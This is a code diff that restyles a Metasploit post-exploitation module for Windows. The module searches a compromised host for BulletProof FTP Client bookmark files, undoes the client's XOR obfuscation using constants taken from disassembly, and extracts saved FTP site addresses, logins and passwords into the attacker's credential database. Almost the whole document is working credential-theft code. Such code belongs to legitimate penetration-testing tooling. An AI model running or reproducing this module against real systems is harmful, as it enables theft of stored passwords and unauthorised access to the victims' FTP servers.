@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,28 +9,25 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Gather BulletProof FTP Client Saved Password Extraction',
-      'Description'   => %q{
-          This module extracts information from BulletProof FTP Bookmarks files and store
-        retrieved credentials in the database.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'juan vazquez'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Gather BulletProof FTP Client Saved Password Extraction',
+                      'Description'   => %q(
+                          This module extracts information from BulletProof FTP Bookmarks files and store
+                        retrieved credentials in the database.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'juan vazquez'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   class BookmarksParser
-
     # Array of entries found after parsing a Bookmarks File
     attr_accessor :entries
 
@@ -40,11 +38,9 @@ class MetasploitModule < Msf::Post
     end
 
     def parse_bookmarks
-      if not parse_header
-        return
-      end
+      return unless parse_header
 
-      while @contents_bookmark.length > 0
+      until @contents_bookmark.empty?
         parse_entry
         @contents_bookmark.slice!(0, 25) # 25 null bytes between entries
       end
@@ -53,33 +49,33 @@ class MetasploitModule < Msf::Post
     private
 
     def low_dword(value)
-      return Rex::Text.pack_int64le(value).unpack("VV")[0]
+      Rex::Text.pack_int64le(value).unpack("VV")[0]
     end
 
     def high_dword(value)
-      return Rex::Text.pack_int64le(value).unpack("VV")[1]
+      Rex::Text.pack_int64le(value).unpack("VV")[1]
     end
 
     def low_byte(value)
-      return [value].pack("V").unpack("C*")[0]
+      [value].pack("V").unpack("C*")[0]
     end
 
     def generate_xor_key
       # Magic numbers 0x100 and 0x8088405 is obtained from bpftpclient.exe static analysis:
-      #.text:007B13C1                 mov     eax, 100h
+      # .text:007B13C1                 mov     eax, 100h
       # ... later
-      #.text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h
-      #.text:00403829                 inc     edx
-      #.text:0040382A                 mov     dword_7EF008[ebx], edx
-      #.text:00403830                 mul     edx
+      # .text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h
+      # .text:00403829                 inc     edx
+      # .text:0040382A                 mov     dword_7EF008[ebx], edx
+      # .text:00403830                 mul     edx
       temp = @xor_key * 0x8088405
       temp = low_dword(temp)
-      temp = temp + 1
+      temp += 1
       @xor_key = temp
       result = temp * 0x100
       result = high_dword(result)
       result = low_byte(result)
-      return result
+      result
     end
 
     def decrypt(encrypted)
@@ -89,19 +85,19 @@ class MetasploitModule < Msf::Post
       encrypted = encrypted[1..length]
       return "" if encrypted.length != length
       decrypted = ""
-      encrypted.unpack("C*").each { |byte|
+      encrypted.unpack("C*").each do |byte|
         key = generate_xor_key
         decrypted << [byte ^ key].pack("C")
-      }
-      return decrypted
+      end
+      decrypted
     end
 
     def parse_object
-      object_length = @contents_bookmark[0,1].unpack("C")[0]
+      object_length = @contents_bookmark[0, 1].unpack("C")[0]
       object = @contents_bookmark[0, object_length + 1 ]
-      @contents_bookmark.slice!(0, object_length+1)
+      @contents_bookmark.slice!(0, object_length + 1)
       content = decrypt(object)
-      return content
+      content
     end
 
     def parse_entry
@@ -114,75 +110,69 @@ class MetasploitModule < Msf::Post
       password = parse_object
 
       @entries << {
-        :site_name => site_name,
-        :site_address => site_address,
-        :login => login,
-        :remote_dir => remote_dir,
-        :local_dir => local_dir,
-        :port => port,
-        :password => password
+        site_name: site_name,
+        site_address: site_address,
+        login: login,
+        remote_dir: remote_dir,
+        local_dir: local_dir,
+        port: port,
+        password: password
       }
     end
 
     def parse_header
       signature = parse_object
-      if not signature.eql?("BPSitelist")
+      unless signature.eql?("BPSitelist")
         return false # Error!
       end
 
       unknown = @contents_bookmark.slice!(0, 4) # "\x01\x00\x00\x00"
       return false unless unknown == "\x01\x00\x00\x00"
 
-      return true
+      true
     end
   end
 
   def check_installation
     bullet_reg = "HKCU\\SOFTWARE\\BulletProof Software"
-    bullet_reg_ver = registry_enumkeys("#{bullet_reg}")
+    bullet_reg_ver = registry_enumkeys(bullet_reg.to_s)
 
     return false if bullet_reg_ver.nil?
 
-    bullet_reg_ver.each { |key|
-      if key =~ /BulletProof FTP Client/
-        return true
-      end
-    }
-    return false
+    bullet_reg_ver.each do |key|
+      return true if key =~ /BulletProof FTP Client/
+    end
+    false
   end
 
   def get_bookmarks(path)
-
     bookmarks = []
 
-    if not directory?(path)
-      return bookmarks
-    end
+    return bookmarks unless directory?(path)
 
     session.fs.dir.foreach(path) do |entry|
-      if directory?("#{path}\\#{entry}") and entry != "." and entry != ".."
+      if directory?("#{path}\\#{entry}") && (entry != ".") && (entry != "..")
         bookmarks.concat(get_bookmarks("#{path}\\#{entry}"))
-      elsif entry =~ /bpftp.dat/ and file?("#{path}\\#{entry}")
+      elsif entry =~ /bpftp.dat/ && file?("#{path}\\#{entry}")
         vprint_good("BulletProof FTP Bookmark file found at #{path}\\#{entry}")
         bookmarks << "#{path}\\#{entry}"
       end
     end
-    return bookmarks
+    bookmarks
   end
 
   def check_bulletproof(user_dir)
     session.fs.dir.foreach(user_dir) do |directory|
       if directory =~ /BulletProof Software/
         vprint_status("BulletProof Data Directory found at #{user_dir}\\#{directory}")
-        return "#{user_dir}\\#{directory}"#"\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
+        return "#{user_dir}\\#{directory}" # "\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
       end
     end
-    return nil
+    nil
   end
 
   def report_findings(entries)
-
-    entries.each{ |entry|
+    entries.each do |entry|
       @credentials << [
         entry[:site_name],
         entry[:site_address],
@@ -204,7 +194,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: entry[:login],
         private_data: entry[:password],
         private_type: :password
@@ -219,23 +209,22 @@ class MetasploitModule < Msf::Post
       }
 
       create_credential_login(login_data.merge(service_data))
-    }
+    end
   end
 
   def run
-
     print_status("Checking if BulletProof FTP Client is installed...")
-    if not check_installation
+    unless check_installation
       print_error("BulletProof FTP Client isn't installed")
       return
     end
 
     print_status("Searching BulletProof FTP Client Data directories...")
     # BulletProof FTP Client 2010 uses User Local Settings to store bookmarks files
-    profiles = grab_user_profiles()
+    profiles = grab_user_profiles
     bullet_paths = []
     profiles.each do |user|
-      next if user['LocalAppData'] == nil
+      next if user['LocalAppData'].nil?
       bulletproof_dir = check_bulletproof(user['LocalAppData'])
       bullet_paths << bulletproof_dir if bulletproof_dir
     end
@@ -244,11 +233,11 @@ class MetasploitModule < Msf::Post
     # BulletProof FTP Client 2.6 uses the installation dir to store bookmarks files
     progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
     progfilesx86 = progfiles_env['ProgramFiles(X86)']
-    if !progfilesx86.blank? && progfilesx86 !~ /%ProgramFiles\(X86\)%/
-      program_files = progfilesx86 # x64
-    else
-      program_files = progfiles_env['ProgramFiles'] # x86
-    end
+    program_files = if !progfilesx86.blank? && progfilesx86 !~ /%ProgramFiles\(X86\)%/
+                      progfilesx86 # x64
+                    else
+                      progfiles_env['ProgramFiles'] # x86
+                    end
 
     session.fs.dir.foreach(program_files) do |dir|
       if dir =~ /BulletProof FTP Client/
@@ -264,9 +253,9 @@ class MetasploitModule < Msf::Post
 
     print_status("Searching for BulletProof FTP Client Bookmarks files...")
     bookmarks = []
-    bullet_paths.each { |path|
+    bullet_paths.each do |path|
       bookmarks.concat(get_bookmarks(path))
-    }
+    end
     if bookmarks.empty?
       print_error("BulletProof FTP Client Bookmarks files not found.")
       return
@@ -274,15 +263,15 @@ class MetasploitModule < Msf::Post
 
     print_status("Searching for connections data on BulletProof FTP Client Bookmarks files...")
     entries = []
-    bookmarks.each { |bookmark|
+    bookmarks.each do |bookmark|
       p = BookmarksParser.new(read_file(bookmark))
       p.parse_bookmarks
-      if p.entries.length > 0
+      if !p.entries.empty?
         entries.concat(p.entries)
       else
         vprint_error("Entries not found on #{bookmark}")
       end
-    }
+    end
 
     if entries.empty?
       print_error("BulletProof FTP Client Bookmarks not found.")
@@ -302,14 +291,15 @@ class MetasploitModule < Msf::Post
           "Password",
           "Remote Dir",
           "Local Dir"
-        ])
+        ]
+    )
 
     report_findings(entries)
     results = @credentials.to_s
 
     print_line("\n" + results + "\n")
 
-    if not @credentials.rows.empty?
+    unless @credentials.rows.empty?
       p = store_loot(
         'bulletproof.creds',
         'text/plain',
@@ -318,9 +308,7 @@ class MetasploitModule < Msf::Post
         'bulletproof.creds.csv',
         'BulletProof Credentials'
       )
-      print_status("Data stored in: #{p.to_s}")
+      print_status("Data stored in: #{p}")
     end
-
   end
-
 end
